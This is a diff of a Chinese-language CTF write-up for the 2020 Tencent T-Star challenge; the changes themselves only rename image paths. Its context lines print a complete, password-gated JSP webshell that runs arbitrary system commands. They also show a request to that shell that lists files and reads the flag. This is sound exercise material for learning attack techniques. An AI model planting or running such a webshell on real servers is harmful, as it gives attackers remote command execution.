@@ -25,11 +25,11 @@ description: 2020-腾讯犀牛鸟网络安全-T-Star-高校挑战赛
     <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
     +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>
     ```
-    ![构造 webshell](img/t-star-tomcat01.jpg)
+    ![构造 webshell](img/t_star_tomcat01.jpg)
 - 此时可通过`http://f5b9bbe0.yunyansec.com/hack.jsp?&pwd=023&cmd=ls`远程查看文件目录下内容，发现`flag.txt`<br>
-![找到 Flag 文件](img/t-star-tomcat02.jpg)
+![找到 Flag 文件](img/t_star_tomcat02.jpg)
 - `cat`一下即可获取 Flag<br>
-![Catch the flag!](img/t-star-tomcat03.jpg)
+![Catch the flag!](img/t_star_tomcat03.jpg)
 
 ## 参考资料
 
